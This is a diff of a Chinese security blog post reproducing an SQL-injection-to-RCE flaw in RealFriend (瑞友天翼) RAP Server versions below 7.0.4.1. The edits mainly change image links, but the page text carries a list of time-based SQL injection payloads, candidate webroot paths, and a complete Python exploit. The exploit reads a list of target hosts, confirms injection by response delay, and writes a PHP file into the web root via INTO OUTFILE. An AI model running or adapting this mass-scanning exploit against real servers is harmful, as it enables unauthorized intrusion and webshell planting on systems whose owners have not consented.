@@ -16,24 +16,24 @@
   <meta name="author" content="X1ly?S">
   <meta name="keywords" content="网络安全 渗透测试">
   
-    <meta name="description" content="漏洞概述出现问题是出现在客户端，登录功能点处的Computer参数存在SQL注入漏洞，权限足够的话可以写入webshell   影响版本经测试版本&lt;7.0.4.1都存在 漏洞复现 漏洞URL：客户端登录接口  1&#x2F;RAPAgent.XGI?CMD&#x3D;GETApplication&amp;AppID&#x3D;APP00000001&amp;Language&#x3D;ZH-CN&amp;User&#x3D;admin&amp;am">
+    <meta name="description" content="漏洞概述出现问题是出现在客户端，登录功能点处的Computer参数存在SQL注入漏洞，权限足够的话可以写入webshell  影响版本经测试版本&lt;7.0.4.1都存在 漏洞复现 漏洞URL：客户端登录接口  1&#x2F;RAPAgent.XGI?CMD&#x3D;GETApplication&amp;AppID&#x3D;APP00000001&amp;Language&#x3D;ZH-CN&amp;User&#x3D;admin&amp;amp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="瑞友天翼RCE漏洞复现">
 <meta property="og:url" content="https://example.com/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="X1ly?S Blog">
-<meta property="og:description" content="漏洞概述出现问题是出现在客户端，登录功能点处的Computer参数存在SQL注入漏洞，权限足够的话可以写入webshell   影响版本经测试版本&lt;7.0.4.1都存在 漏洞复现 漏洞URL：客户端登录接口  1&#x2F;RAPAgent.XGI?CMD&#x3D;GETApplication&amp;AppID&#x3D;APP00000001&amp;Language&#x3D;ZH-CN&amp;User&#x3D;admin&amp;am">
+<meta property="og:description" content="漏洞概述出现问题是出现在客户端，登录功能点处的Computer参数存在SQL注入漏洞，权限足够的话可以写入webshell  影响版本经测试版本&lt;7.0.4.1都存在 漏洞复现 漏洞URL：客户端登录接口  1&#x2F;RAPAgent.XGI?CMD&#x3D;GETApplication&amp;AppID&#x3D;APP00000001&amp;Language&#x3D;ZH-CN&amp;User&#x3D;admin&amp;amp">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://example.com/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
-<meta property="og:image" content="https://example.com/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png">
-<meta property="og:image" content="https://example.com/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png">
-<meta property="og:image" content="https://example.com/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png">
-<meta property="og:image" content="https://example.com/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/22/DH2rJy3bBZwMv4l.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/22/fK1sDdtWmOYabg2.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/22/5Du1tByRvKS3Pl9.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/22/pJVXbh8FkyoR7ad.png">
+<meta property="og:image" content="https://s2.loli.net/2024/10/22/pRkZj546sfFAqJ3.png">
 <meta property="article:published_time" content="2024-07-31T14:35:16.000Z">
-<meta property="article:modified_time" content="2024-07-31T14:37:36.533Z">
+<meta property="article:modified_time" content="2024-10-22T11:24:31.594Z">
 <meta property="article:author" content="X1ly?S">
 <meta property="article:tag" content="瑞友天翼RCE">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://example.com/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
+<meta name="twitter:image" content="https://s2.loli.net/2024/10/22/DH2rJy3bBZwMv4l.png">
   
   
   
@@ -333,7 +333,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年7月31日 晚上
+                    本文最后更新于 2024年10月22日 晚上
                   
                 
               </p>
@@ -342,8 +342,7 @@
               <div class="markdown-body">
                 
                 <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>出现问题是出现在客户端，登录功能点处的Computer参数存在SQL注入漏洞，权限足够的话可以写入webshell</p>
-<img src="/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/22/DH2rJy3bBZwMv4l.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>经测试版本&lt;7.0.4.1都存在</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
 <p>漏洞URL：客户端登录接口</p>
@@ -359,17 +358,14 @@
 <ol start="2">
 <li>把接口拼接到web端访问</li>
 </ol>
-<img src="/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/22/fK1sDdtWmOYabg2.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>根据返回的信息来看，可能存在SQL注入漏洞</p>
 <p>如果打开提示数据库连接错误，就修改AppID进行递增使它提示用户名或密码错误</p>
-<img src="/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/22/5Du1tByRvKS3Pl9.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <ol start="3">
 <li>丢到burp里测试，使用xia SQL插件给每一个参数都试一试SQL注入的延时payload</li>
 </ol>
-<img src="/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/22/pJVXbh8FkyoR7ad.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p><strong>可以看到，这里的响应明显被延时了，SQL注入漏洞存在！</strong></p>
 <p>xia SQL插件的payload规则支持自定义，比如：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http">&#x27;<br>&quot;<br>&#x27;)<br>&quot;)<br>&#x27; AND 1=2-- +<br>&quot; AND 1=2-- +<br>&#x27; AND &#x27;1&#x27;=&#x27;2<br>&quot; AND &quot;1&quot;=&quot;2<br>&#x27; OR SLEEP(5) -- +<br>&quot; OR SLEEP(5) -- +<br>&#x27; AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND &#x27;test&#x27;=&#x27;test<br>&#x27;) OR SLEEP(5) -- +<br>&#x27; AND 1=CONVERT(int, (SELECT @@version)) --<br>&quot; AND 1=CONVERT(int, (SELECT @@version)) --<br><br>……后面再专门总结<br></code></pre></td></tr></table></figure>
@@ -400,8 +396,7 @@
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http">C:/Program Files (x86)/RealFriend/Rap Server/WebRoot/custom/InfoPage1.files/<br>D:/Program Files (x86)/RealFriend/Rap Server/WebRoot/custom/InfoPage1.files/<br>E:/Program Files (x86)/RealFriend/Rap Server/WebRoot/custom/InfoPage1.files/<br>F:/Program Files (x86)/RealFriend/Rap Server/WebRoot/custom/InfoPage1.files/<br></code></pre></td></tr></table></figure>
 
 <p>成功写入shell</p>
-<img src="/2024/07/31/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BCRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" srcset="/img/loading.gif" lazyload class="">
-
+<p><img src="https://s2.loli.net/2024/10/22/pRkZj546sfFAqJ3.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <h2 id="POC-EXP"><a href="#POC-EXP" class="headerlink" title="POC&#x2F;EXP"></a>POC&#x2F;EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">for</span> host <span class="hljs-keyword">in</span> file:<br>    <span class="hljs-built_in">print</span>(host)<br>    host=host.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-comment"># host=&#x27;http://59.41.185.162:8888/&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):<br>        start_time=time.time()<br>        url=host+<span class="hljs-string">&#x27;/RAPAgent.XGI?CMD=GETApplication&amp;AppID=APP0000000&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&amp;Language=ZH-CN&amp;User=admin&amp;PWD=e10adc3949ba59abbe56e057f20f883e&amp;AuthType=0&amp;Computer=CMD=GETApplication&amp;AppID=APP00000001&amp;Language=ZH-CN&amp;User=admin&amp;PWD=e10adc3949ba59abbe56e057f20f883e&amp;AuthType=0&amp;Computer=WIN-1TLJMBOFIT6%27%20AND%20(SELECT%209990%20FROM%20(SELECT(SLEEP(10)))Joqo)%20AND%20%27DseX%27=%27DseX&amp;Finger=A45A2E5E3&amp;IP=&amp;Finger=A45A2E5E3&amp;IP=&#x27;</span><br>        <span class="hljs-keyword">try</span>: <br>            result=requests.get(url,verify=<span class="hljs-literal">False</span>).text<br>            end_time=time.time()<br>            response_time=end_time-start_time<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(response_time) &gt;= <span class="hljs-number">7</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;存在延时注入,进行文件上传&quot;</span>)<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sql_payload.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>                    f.write(url+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Payload:&#x27;</span>+url)<br>                url=host+<span class="hljs-string">&#x27;/RAPAgent.XGI?CMD=GETApplication&amp;AppID=APP0000000&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&amp;Language=ZH-CN&amp;User=admin&amp;PWD=e10adc3949ba59abbe56e057f20f883e&amp;AuthType=0&amp;Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27C:/Program+Files+(x86)/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&amp;Finger=A45A2E5E3&amp;IP=&#x27;</span><br>                result=requests.get(url,verify=<span class="hljs-literal">False</span>)<br>                url=host+<span class="hljs-string">&#x27;/RAPAgent.XGI?CMD=GETApplication&amp;AppID=APP0000000&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&amp;Language=ZH-CN&amp;User=admin&amp;PWD=e10adc3949ba59abbe56e057f20f883e&amp;AuthType=0&amp;Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27D:/Program+Files+(x86)/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&amp;Finger=A45A2E5E3&amp;IP=&#x27;</span><br>                result=requests.get(url,verify=<span class="hljs-literal">False</span>)<br>                url=host+<span class="hljs-string">&#x27;/RAPAgent.XGI?CMD=GETApplication&amp;AppID=APP0000000&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&amp;Language=ZH-CN&amp;User=admin&amp;PWD=e10adc3949ba59abbe56e057f20f883e&amp;AuthType=0&amp;Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27C:/Program+Files/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&amp;Finger=A45A2E5E3&amp;IP=&#x27;</span><br>                result=requests.get(url,verify=<span class="hljs-literal">False</span>)<br>                url=host+<span class="hljs-string">&#x27;/RAPAgent.XGI?CMD=GETApplication&amp;AppID=APP0000000&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&amp;Language=ZH-CN&amp;User=admin&amp;PWD=e10adc3949ba59abbe56e057f20f883e&amp;AuthType=0&amp;Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27D:/Program+Files/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&amp;Finger=A45A2E5E3&amp;IP=&#x27;</span><br>                result=requests.get(url,verify=<span class="hljs-literal">False</span>)<br>                url=host+<span class="hljs-string">&#x27;/custom/InfoPage1.files/poctest.php&#x27;</span>    <br>                result=requests.get(url,verify=<span class="hljs-literal">False</span>).text<br>                <span class="hljs-keyword">if</span> result.find(<span class="hljs-string">&#x27;phpinfo&#x27;</span>)!=-<span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(url+<span class="hljs-string">&#x27;-文件上传成功&#x27;</span>)<br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;phpinfo_url.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>                        f.write(url+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;文件上传失败&#x27;</span>)<br><br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;注入不存在&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错误请求&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br>file.close()<br></code></pre></td></tr></table></figure>
 
 
